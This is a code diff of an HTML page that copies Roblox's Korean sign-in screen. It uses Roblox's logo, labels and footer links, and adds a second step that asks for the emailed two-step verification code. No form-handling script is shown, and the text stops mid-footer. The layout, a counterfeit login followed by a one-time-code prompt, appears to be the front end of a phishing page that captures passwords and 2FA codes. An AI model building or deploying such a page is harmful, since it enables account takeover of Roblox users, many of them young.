@@ -4,117 +4,89 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Roblox</title>
-<link rel="icon" href="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%}
-body{font-family:Gotham SSm,Gotham,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans KR',sans-serif;background:#fff;color:#393b3d;-webkit-font-smoothing:antialiased}
+body{font-family:Gotham SSm,Gotham,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,'Noto Sans KR',sans-serif;color:#393b3d;-webkit-font-smoothing:antialiased}
 a{text-decoration:none}
 input{outline:none;font-family:inherit}
-.container-login{background:#fff;min-height:100vh;display:flex;flex-direction:column}
-.login-header{background:#393b3d;padding:14px 20px;display:flex;align-items:center}
-.login-header img{height:32px;width:auto}
-.login-main{flex:1;padding:32px 24px;display:flex;flex-direction:column;align-items:center}
-.logo-wrap{text-align:center;margin-bottom:28px;width:100%;max-width:400px}
-.logo-wrap img{width:100%;max-width:280px;height:auto;margin-bottom:20px}
-.form-group{margin-bottom:18px;width:100%;max-width:400px}
-.form-group label{display:block;font-size:14px;font-weight:600;color:#393b3d;margin-bottom:6px;letter-spacing:0.2px}
-.form-group input{width:100%;padding:14px 16px;border:1px solid #b8b8b8;border-radius:4px;font-size:16px;background:#fff;color:#393b3d;transition:border-color .15s ease}
-.form-group input:focus{border-color:#0074bd;box-shadow:inset 0 0 0 1px #0074bd}
-.form-group input::placeholder{color:#a8a8a8}
-.btn-primary-login{width:100%;max-width:400px;padding:14px;background:#0074bd;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;letter-spacing:0.3px;margin-top:8px;font-family:inherit}
-.btn-primary-login:active{background:#005a94}
-.btn-primary-login:disabled{background:#a8d4f0;cursor:not-allowed}
-.forgot-link{display:block;width:100%;max-width:400px;text-align:center;margin-top:16px;font-size:14px;color:#0074bd;font-weight:500}
-.divider-wrap-login{display:flex;align-items:center;width:100%;max-width:400px;margin:24px 0;color:#a8a8a8;font-size:13px}
-.divider-wrap-login::before,.divider-wrap-login::after{content:'';flex:1;height:1px;background:#e0e0e0}
-.divider-wrap-login span{padding:0 14px}
-.btn-secondary-login{width:100%;max-width:400px;padding:13px;background:#fff;color:#393b3d;border:1px solid #b8b8b8;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit}
-.btn-secondary-login:active{background:#f5f5f5}
-.signup-section{width:100%;max-width:400px;margin-top:32px;padding:20px 0;border-top:1px solid #e0e0e0;text-align:center}
-.signup-section p{font-size:14px;color:#393b3d;margin-bottom:8px}
-.signup-section a{color:#0074bd;font-weight:700;font-size:14px}
-.error-msg-login{color:#d22d2d;font-size:13px;width:100%;max-width:400px;margin-top:12px;display:none;padding:10px 14px;background:#fce8e6;border:1px solid #f5c6c2;border-radius:4px;text-align:center}
-.footer{background:#393b3d;padding:18px 20px;text-align:center}
-.footer-links{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:14px;margin-bottom:10px}
-.footer-links a{color:#b8b8b8;font-size:12px}
-.footer-links a:hover{color:#fff}
-.footer-copy{color:#7a7c7e;font-size:11px;line-height:1.6}
-#step2fa{display:none}
-#step1{display:block}
-@media(max-width:480px){
-.login-main{padding:24px 18px}
-}
+.page-wrap{background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}
+.topbar{background:#393b3d;padding:16px 20px;display:flex;align-items:center}
+.topbar img{height:34px;display:block}
+.main{flex:1;padding:40px 20px 30px;display:flex;flex-direction:column;align-items:center}
+.logo-area{text-align:center;margin-bottom:6px}
+.logo-area img{width:100%;max-width:240px;display:block;margin:0 auto 10px}
+.form-box{width:100%;max-width:380px;background:#fff;border-radius:6px;padding:28px 24px 20px;box-shadow:0 1px 4px rgba(0,0,0,0.08)}
+.fgroup{margin-bottom:18px}
+.fgroup label{display:block;font-size:14px;font-weight:600;color:#393b3d;margin-bottom:6px}
+.fgroup input{width:100%;padding:13px 14px;border:1px solid #c8c8c8;border-radius:4px;font-size:15px;background:#fff;color:#393b3d}
+.fgroup input:focus{border-color:#0074bd;box-shadow:inset 0 0 0 1px #0074bd}
+.btn-blue{width:100%;padding:14px;background:#0074bd;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-top:6px}
+.btn-blue:active{background:#005a94}
+.link-blue{display:block;text-align:center;margin-top:16px;font-size:14px;color:#0074bd;font-weight:500}
+.divider{display:flex;align-items:center;margin:22px 0;color:#a8a8a8;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
+.divider span{padding:0 14px}
+.btn-white{width:100%;padding:13px;background:#fff;color:#393b3d;border:1px solid #c8c8c8;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;font-family:inherit}
+.btn-white:active{background:#f5f5f5}
+.signup{width:100%;max-width:380px;margin-top:24px;padding:18px 0;border-top:1px solid #e0e0e0;text-align:center}
+.signup p{font-size:14px;color:#393b3d;margin-bottom:6px}
+.signup a{color:#0074bd;font-weight:700;font-size:14px}
+.err{color:#d22d2d;font-size:13px;margin-top:12px;display:none;padding:10px 14px;background:#fce8e6;border:1px solid #f5c6c2;border-radius:4px;text-align:center}
+.btm{background:#393b3d;padding:18px 20px;text-align:center}
+.btm ul{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:14px;margin-bottom:10px}
+.btm ul li a{color:#b8b8b8;font-size:12px}
+.btm ul li a:hover{color:#fff}
+.btm p{color:#7a7c7e;font-size:11px;line-height:1.6}
+#s2fa{display:none}
+.center{text-align:center}
+@media(max-width:480px){.form-box{padding:20px 16px 16px}}
 </style>
 </head>
 <body>
 
-<div class="container-login">
+<div class="page-wrap">
 
-<div class="login-header">
-<a href="#"><img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg" alt="Roblox"></a>
-</div>
+<div class="topbar"><img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg" alt="Roblox"></div>
 
-<div class="login-main">
+<div class="main">
 
-<div id="step1">
-<div class="logo-wrap">
-<img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg" alt="Roblox">
-</div>
-
-<form id="loginForm" style="width:100%;display:flex;flex-direction:column;align-items:center">
-<div class="form-group"><label for="username">사용자 이름</label><input type="text" id="username" placeholder="사용자 이름" required autocomplete="off"></div>
-<div class="form-group"><label for="password">비밀번호</label><input type="password" id="password" placeholder="비밀번호" required autocomplete="off"></div>
-<button class="btn-primary-login" type="submit">로그인</button>
-<a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요</a>
-<div class="divider-wrap-login"><span>또는</span></div>
-<button class="btn-secondary-login" type="button">
-<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#393b3d" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-다른 기기로 로그인
-</button>
-<div class="error-msg-login" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다</div>
-</form>
-
-<div class="signup-section">
-<p>계정이 없으신가요</p>
-<a href="#">계정 만들기</a>
-</div>
-</div>
-
-<div id="step2fa" style="width:100%;display:flex;flex-direction:column;align-items:center">
-<div class="logo-wrap">
-<img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg" alt="Roblox">
-</div>
-<h2 style="font-size:22px;font-weight:700;color:#393b3d;margin-bottom:8px;text-align:center;width:100%;max-width:400px">2단계 인증</h2>
-<p style="font-size:15px;color:#393b3d;line-height:1.5;text-align:center;width:100%;max-width:400px;margin-bottom:8px">귀하의 이메일 <strong id="faEmailDisplay" style="font-weight:700"></strong> 로 전송된 인증 코드를 입력하십시오</p>
-
-<form id="faForm" style="width:100%;display:flex;flex-direction:column;align-items:center">
-<div class="form-group" style="max-width:400px">
-<label for="faCode">인증 코드</label>
-<input type="text" id="faCode" placeholder="6자리 코드" maxlength="6" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" style="letter-spacing:8px;text-align:center;font-size:20px">
-</div>
-<button class="btn-primary-login" type="submit">확인</button>
-<div style="width:100%;max-width:400px;text-align:center;margin-top:16px;font-size:14px;color:#7a7c7e">
-코드를 받지 못하셨나요 <a href="#" style="color:#0074bd;font-weight:500">다시 보내기</a>
-</div>
-<div class="error-msg-login" id="faErrorMsg">잘못된 코드입니다 다시 시도하십시오</div>
+<!-- 1단계 로그인 -->
+<div id="s1">
+<div class="logo-area"><img src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1-roblox_logo.svg" alt="Roblox"></div>
+<div class="form-box">
+<form id="f1">
+<div class="fgroup"><label>사용자 이름</label><input type="text" id="uid" placeholder="사용자 이름" required></div>
+<div class="fgroup"><label>비밀번호</label><input type="password" id="pw" placeholder="비밀번호" required></div>
+<button class="btn-blue" type="submit">로그인</button>
+<a href="#" class="link-blue">비밀번호 또는 사용자 이름을 잊으셨나요</a>
+<div class="divider"><span>또는</span></div>
+<button class="btn-white" type="button"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#393b3d" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg> 다른 기기로 로그인</button>
+<div class="err" id="e1">사용자 이름 또는 비밀번호가 올바르지 않습니다</div>
 </form>
 </div>
+<div class="signup"><p>계정이 없으신가요</p><a href="#">계정 만들기</a></div>
+</div>
+
+<!-- 2단계 인증 -->
+<div id="s2fa">
+<div class="form-box">
+<div class="center"><h2 style="font-size:20px;font-weight:700;color:#393b3d;margin-bottom:12px">2단계 인증</h2></div>
+<p style="font-size:14px;color:#393b3d;line-height:1.5;text-align:center;margin-bottom:20px">귀하의 이메일 <strong id="faMail" style="font-weight:700"></strong> 로 전송된 인증 코드를 입력하십시오</p>
+<form id="f2">
+<div class="fgroup"><label>인증 코드</label><input type="text" id="fac" placeholder="6자리 코드" maxlength="6" inputmode="numeric" required style="letter-spacing:6px;text-align:center;font-size:18px"></div>
+<button class="btn-blue" type="submit">확인</button>
+<div style="text-align:center;margin-top:14px;font-size:14px;color:#7a7c7e">코드를 받지 못하셨나요 <a href="#" style="color:#0074bd;font-weight:500">다시 보내기</a></div>
+<div class="err" id="e2">잘못된 코드입니다 다시 시도하십시오</div>
+</form>
+</div>
+</div>
 
 </div>
 
-<div class="footer">
-<ul class="footer-links">
-<li><a href="#">회사 소개</a></li>
-<li><a href="#">인재 채용</a></li>
-<li><a href="#">블로그</a></li>
-<li><a href="#">보호자 가이드</a></li>
-<li><a href="#">기프트 카드</a></li>
-<li><a href="#">도움말</a></li>
-<li><a href="#">이용 약관</a></li>
-<li><a href="#">접근성</a></li>
-<li><a href="#">개인정보</a></li>
-<li><a href="#">설정</a></li>
-<li><a href="#">사이트 맵</a></li>
-</ul>
-<p class="footer-copy">2026 Roblox Corporation Roblox 로고 및 Powering Imagination은 미국 및
+<div class="btm">
+<ul>
+<li><a href="#">회사 소개</a></li><li><a href="#">인재 채용</a></li><li><a href="#">블로그</a></li>
+<li><a href="#">보호자 가이드</a></li><li><a href="#">기프트 카드</a></li><li><a href="#">도움말</a></li>
+<li><a href="#">이용 약관</a></li><li><a href="#">접근성</a></li><li><a href="#">개인정보</a></li>
+<li><a href="#">
